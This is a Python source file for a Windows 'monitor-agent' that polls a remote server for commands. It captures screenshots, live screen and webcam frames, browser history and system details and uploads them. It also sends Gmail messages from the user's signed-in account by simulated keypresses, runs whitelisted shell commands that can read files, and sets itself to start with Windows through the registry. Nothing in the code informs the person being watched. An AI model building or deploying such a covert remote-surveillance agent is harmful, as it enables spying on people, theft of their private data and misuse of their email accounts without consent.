import base64
import io
import os
import shutil
import sqlite3
import subprocess
import tempfile
import time
import urllib.parse
import webbrowser
import sys
import winreg
import getpass
import platform
import uuid
from datetime import datetime, timedelta
import psutil
import json
import requests

# ===========================================================================
#  API PATH  — set this to your backend (server.js) URL before building the exe.
#  This is the ONLY thing you must change to point the agent at a hosted server.
#     local:   http://localhost:8000
#     hosted:  https://your-domain.example      (or  http://<server-ip>:8000)
# ===========================================================================
API_BASE = os.environ.get("API_BASE", "https://laptop-control.onrender.com")
APP_NAME = "monitor-agent"  # name of the agent in the Windows registry (for auto-start)
# Must match AGENT_KEY in the backend (server.js / its env).
AGENT_KEY = os.environ.get("AGENT_KEY", "fu2//i6ryxk2kvkIDUaQl+VlLekkkhRLNfj1ndpFcFo=")

# How often the agent asks the backend for a new command. Lower = snappier live
# monitoring (screen/camera streams, USB detection), at the cost of more polling.
POLL_INTERVAL = float(os.environ.get("POLL_INTERVAL", "0.5"))   # seconds

# Seconds to wait for the Gmail compose window to load before auto-sending
# (Ctrl+Enter). Increase this on slow machines / connections if mail doesn't send.
MAIL_SEND_DELAY = float(os.environ.get("MAIL_SEND_DELAY", "7"))

HEADERS = {"X-Agent-Key": AGENT_KEY}


# ===========================================================================
#  AGENT IDENTITY  — how this laptop identifies itself so the dashboard can
#  list it, show the user, and its live online status.
# ===========================================================================
def get_or_create_agent_id():
    """A stable unique id for this install, persisted in the registry."""
    key_path = r"Software\\" + APP_NAME
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            value, _ = winreg.QueryValueEx(key, "AgentId")
            if value:
                return value
    except FileNotFoundError:
        pass
    new_id = uuid.uuid4().hex[:12]
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
        winreg.SetValueEx(key, "AgentId", 0, winreg.REG_SZ, new_id)
    return new_id


AGENT_ID = get_or_create_agent_id()


def system_identity():
    """Who + which machine this is — used to identify the employee laptop."""
    return {
        "agent_id": AGENT_ID,
        "username": getpass.getuser(),          # the logged-in Windows user
        "hostname": platform.node(),            # the computer name
        "os": f"{platform.system()} {platform.release()}",
    }


def register_agent():
    """Tell the server who we are (called at startup and periodically)."""
    try:
        requests.post(
            f"{API_BASE}/api/agent/register",
            headers=HEADERS,
            json=system_identity(),
            timeout=15,
        )
    except Exception as e:
        print(f"register failed: {e}")


# Every poll carries our id so the server can update our live "last seen".
HEADERS["X-Agent-Id"] = AGENT_ID


# ===========================================================================
#  TOOLS  — each returns (content_type, data) where data is a string.
# ===========================================================================
def tool_screenshot():
    """1 — full-screen screenshot -> base64 PNG."""
    import pyautogui
    img = pyautogui.screenshot()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return "image", "data:image/png;base64," + b64(buf.getvalue())

def tool_cpu():
    """2 — One CPU, RAM, Disk, and System snapshot -> JSON."""

    import json
    import platform
    import psutil
    import time
    from datetime import datetime

    uname = platform.uname()

    # Prime CPU counters
    psutil.cpu_percent(interval=None)
    time.sleep(0.3)

    per_core = psutil.cpu_percent(interval=None, percpu=True)
    total = psutil.cpu_percent(interval=None)
    freq = psutil.cpu_freq()

    # Find busiest process
    top = None
    for p in psutil.process_iter(["name", "cpu_percent"]):
        try:
            cpu = p.info["cpu_percent"] or 0
            if top is None or cpu > top[1]:
                top = (p.info["name"], cpu)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    # RAM Information
    ram = psutil.virtual_memory()

    # Disk Information
    disk = psutil.disk_usage("/")

    data = {
        "system_info": {
            "system": uname.system,
            "release": uname.release,
            "version": uname.version,
            "machine": uname.machine,
            "processor": uname.processor,
        },

        "cpu": {
            "physical_cores": psutil.cpu_count(logical=False),
            "logical_cores": psutil.cpu_count(logical=True),
            "total_cpu_percent": round(total, 1),
            "current_freq_mhz": round(freq.current, 1) if freq else None,
            "max_freq_mhz": round(freq.max, 1) if freq else None,
            "min_freq_mhz": round(freq.min, 1) if freq else None,
            "per_core_percent": [round(x, 1) for x in per_core],
            "busiest_process": {
                "name": top[0],
                "cpu_percent": round(top[1], 1)
            } if top else None,
        },

        "memory": {
            "total_gb": round(ram.total / (1024 ** 3), 2),
            "available_gb": round(ram.available / (1024 ** 3), 2),
            "used_gb": round(ram.used / (1024 ** 3), 2),
            "free_gb": round(ram.free / (1024 ** 3), 2),
            "percent_used": ram.percent,
        },

        "disk": {
            "total_gb": round(disk.total / (1024 ** 3), 2),
            "used_gb": round(disk.used / (1024 ** 3), 2),
            "free_gb": round(disk.free / (1024 ** 3), 2),
            "percent_used": disk.percent,
        },

        "captured_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    return "json", json.dumps(data)


def tool_camera():
    """3 — grab one frame from the default camera -> base64 JPEG."""
    import cv2
    cap = cv2.VideoCapture(0)
    try:
        if not cap.isOpened():
            return "text", "Error: could not access the camera."
        for _ in range(5):                       # let exposure settle
            ok, frame = cap.read()
        if not ok:
            return "text", "Error: failed to grab a frame."
        ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        return "image", "data:image/jpeg;base64," + b64(buf.tobytes())
    finally:
        cap.release()

# Kept-open camera handle so live streaming doesn't reopen the device each
# frame (reopening is slow and makes the camera light flicker).
_camera_cap = None


def tool_camera_stream():
    """8 — one LIVE frame from a kept-open camera -> base64 JPEG.

    The live-camera page re-requests this repeatedly to form a stream. The
    capture device stays open between calls for speed; it is released only if
    it stops working. Polling is sequential, so there is no race on the handle.
    """
    import cv2
    global _camera_cap

    if _camera_cap is None or not _camera_cap.isOpened():
        _camera_cap = cv2.VideoCapture(0)

    if not _camera_cap.isOpened():
        _camera_cap = None
        return "text", "Error: could not access the camera."

    ok, frame = _camera_cap.read()
    if not ok:
        _camera_cap.release()
        _camera_cap = None
        return "text", "Error: failed to grab a frame."

    ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
    return "image", "data:image/jpeg;base64," + b64(buf.tobytes())


def tool_usb():
    """7 — current removable (USB) drives as a JSON array (empty [] if none).

    Always returns a JSON array so the USB monitor page can poll this and
    detect changes: a drive appearing = plugged in, disappearing = removed.
    """
    drives = []

    for part in psutil.disk_partitions(all=False):

        if "removable" in part.opts.lower():

            info = {
                "drive": part.device,
                "mount": part.mountpoint,
                "filesystem": part.fstype or "",
            }
            try:
                usage = psutil.disk_usage(part.mountpoint)
                info["total_gb"] = round(usage.total / (1024 ** 3), 2)
                info["used_gb"] = round(usage.used / (1024 ** 3), 2)
            except Exception:
                pass
            drives.append(info)

    return "json", json.dumps(drives)

def tool_history():
    """4 — recent browser history (Chrome/Edge/Brave) -> JSON list."""
    import json

    local = os.environ.get("LOCALAPPDATA", "")
    browsers = {
        "Chrome": os.path.join(local, r"Google\Chrome\User Data\Default\History"),
        "Edge":   os.path.join(local, r"Microsoft\Edge\User Data\Default\History"),
        "Brave":  os.path.join(local, r"BraveSoftware\Brave-Browser\User Data\Default\History"),
    }
    epoch = datetime(1601, 1, 1)
    rows = []
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        tmp = os.path.join(tempfile.gettempdir(), f"{name}_history_copy")
        try:
            shutil.copy2(path, tmp)               # DB is locked while browser runs
            con = sqlite3.connect(tmp)
            cur = con.cursor()
            cur.execute(
                "SELECT url, title, last_visit_time FROM urls "
                "ORDER BY last_visit_time DESC LIMIT 20"
            )
            for url, title, visit in cur.fetchall():
                when = (epoch + timedelta(microseconds=visit)).strftime("%Y-%m-%d %H:%M:%S") if visit else ""
                rows.append({"browser": name, "time": when, "title": title or "(no title)", "url": url})
            con.close()
        except Exception as e:
            rows.append({"browser": name, "time": "", "title": f"(error: {e})", "url": ""})
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
    if not rows:
        return "text", "No browser history found (or all browsers locked)."
    return "json", json.dumps(rows)


# Common Chrome install locations on Windows (first one found is used).
CHROME_PATHS = [
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    os.path.join(os.environ.get("LOCALAPPDATA", ""), r"Google\Chrome\Application\chrome.exe"),
]


def tool_email(payload):
    """5 — open a prefilled Gmail compose window and auto-send it.

    Uses the signed-in Gmail account in the browser (no SMTP / app password):
    opens compose via URL, waits MAIL_SEND_DELAY for it to load, then sends with
    Gmail's Ctrl+Enter shortcut. Requires a graphical session (the exe must run
    on a logged-in desktop, not headless).
    """
    import pyautogui

    payload = payload or {}
    to = payload.get("to")
    subject = payload.get("subject") or ""
    body = payload.get("body") or ""
    if not to:
        return "text", "No recipient provided."

    gmail_url = (
        "https://mail.google.com/mail/?view=cm&fs=1"
        f"&to={urllib.parse.quote(to)}"
        f"&su={urllib.parse.quote(subject)}"
        f"&body={urllib.parse.quote(body)}"
    )

    try:
        chrome = next((p for p in CHROME_PATHS if p and os.path.exists(p)), None)
        if chrome:
            subprocess.Popen([chrome, gmail_url])
        else:
            webbrowser.open(gmail_url)          # fall back to the default browser

        # Wait for the compose window to render, then send (Ctrl+Enter).
        time.sleep(MAIL_SEND_DELAY)
        pyautogui.hotkey("ctrl", "enter")
        return "text", f"Email sent to {to} (via Gmail compose)."
    except Exception as e:
        return "text", f"Could not send email: {e}"


def tool_screen():
    """6 — one screen frame -> base64 JPEG (the browser re-requests to 'stream')."""
    import cv2
    import numpy as np
    import mss

    with mss.mss() as sct:
        monitor = sct.monitors[1]
        img = np.array(sct.grab(monitor))
        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
        ok, buf = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 60])
    return "image", "data:image/jpeg;base64," + b64(buf.tobytes())


# ---------------------------------------------------------------------------
#  Safe terminal (tool 9) — run ONE whitelisted command for monitoring.
#  Only the commands below are permitted; anything else is refused. This keeps
#  the terminal read-only / diagnostic and prevents destructive actions.
# ---------------------------------------------------------------------------
SAFE_COMMANDS = {
    "dir", "cd", "cls", "echo", "hostname", "whoami", "ipconfig", "systeminfo",
    "ping", "tree", "type", "tasklist", "date", "time", "ver", "help",
    "set", "where", "netstat", "vol",
}

# Persistent working directory (the agent process stays alive between polls,
# so `cd` carries over from one command to the next).
_terminal_cwd = os.path.expanduser("~")


def _terminal_is_safe(command):
    if not command.strip():
        return False
    return command.split()[0].lower() in SAFE_COMMANDS


def tool_safe_terminal(payload):
    """9 — run one whitelisted shell command and return its output as text."""
    global _terminal_cwd
    payload = payload or {}
    command = (payload.get("command") or "").strip()
    if not command:
        return "text", "No command provided."

    low = command.lower()

    # `cls` — nothing to clear in a one-shot result; just echo a blank line.
    if low == "cls":
        return "text", ""

    # `cd` — change the persistent working directory.
    if low == "cd" or low.startswith("cd "):
        parts = command.split(maxsplit=1)
        if len(parts) == 1:
            return "text", _terminal_cwd
        target = parts[1].strip().strip('"')
        path = target if os.path.isabs(target) else os.path.join(_terminal_cwd, target)
        path = os.path.normpath(path)
        if os.path.isdir(path):
            _terminal_cwd = path
            return "text", f"{_terminal_cwd}>"
        return "text", f"Directory not found: {target}"

    # Block anything not on the whitelist.
    if not _terminal_is_safe(command):
        return "text", f"Command not allowed: {command.split()[0]}"

    # Run it (30s cap) inside the persistent working directory.
    try:
        result = subprocess.run(
            ["cmd", "/c", command],
            cwd=_terminal_cwd,
            capture_output=True,
            text=True,
            timeout=30,
        )
        out = result.stdout + (("\n" + result.stderr) if result.stderr else "")
        header = f"{_terminal_cwd}> {command}\n"
        return "text", header + (out if out.strip() else "(no output)")
    except subprocess.TimeoutExpired:
        return "text", "Command timed out (30s limit)."
    except Exception as e:
        return "text", f"Error: {e}"


DISPATCH = {
    1: lambda payload: tool_screenshot(),
    2: lambda payload: tool_cpu(),
    3: lambda payload: tool_camera(),
    4: lambda payload: tool_history(),
    5: lambda payload: tool_email(payload),
    6: lambda payload: tool_screen(),
    7: lambda payload: tool_usb(),
    8: lambda payload: tool_camera_stream(),
    9: lambda payload: tool_safe_terminal(payload),
}


# ===========================================================================
#  HELPERS
# ===========================================================================
def b64(raw_bytes):
    return base64.b64encode(raw_bytes).decode("ascii")


def post_result(command_id, content_type, data):
    requests.post(
        f"{API_BASE}/api/result",
        headers=HEADERS,
        json={"command_id": command_id, "content_type": content_type, "data": data},
        timeout=30,
    )


def get_program_path():
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(__file__)

def is_registered():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        ) as key:

            value, _ = winreg.QueryValueEx(key, APP_NAME)
            return value == get_program_path()

    except FileNotFoundError:
        return False

def register_startup():
    with winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    ) as key:

        winreg.SetValueEx(
            key,
            APP_NAME,
            0,
            winreg.REG_SZ,
            get_program_path()
        )
# ===========================================================================
#  MAIN POLL LOOP
# ===========================================================================
def main():
    print(f"Agent started. Polling {API_BASE} every {POLL_INTERVAL}s. Ctrl+C to stop.")
    print("Application Started")

    if not is_registered():
        register_startup()
        print("Startup Enabled")
    else:
        print("Already Registered")

    # Identify this laptop to the server (user, hostname, OS) for the dashboard.
    ident = system_identity()
    print(f"Identity: {ident['username']}@{ident['hostname']} (id {AGENT_ID})")
    register_agent()
    reregister_every = max(1, int(30 / POLL_INTERVAL))  # refresh identity ~every 30s
    tick = 0

    print("Running Main Program...")
    while True:
        tick += 1
        if tick % reregister_every == 0:
            register_agent()
        try:
            resp = requests.get(f"{API_BASE}/api/command/next", headers=HEADERS, timeout=15)
            if resp.status_code == 401:
                print("Rejected: agent key mismatch. Check AGENT_KEY.")
                time.sleep(5)
                continue
            command = resp.json().get("command")
        except Exception as e:
            print(f"Poll error: {e}")
            time.sleep(POLL_INTERVAL)
            continue

        if not command:
            time.sleep(POLL_INTERVAL)
            continue

        cmd_id, tool_no, payload = command["id"], command["tool_no"], command.get("payload")
        print(f"Running tool {tool_no} (command {cmd_id})...")
        try:
            content_type, data = DISPATCH[tool_no](payload)
        except Exception as e:
            content_type, data = "text", f"Tool {tool_no} failed: {e}"
        try:
            post_result(cmd_id, content_type, data)
            print(f"  -> result posted ({content_type}).")
        except Exception as e:
            print(f"  -> failed to post result: {e}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAgent stopped.")
        
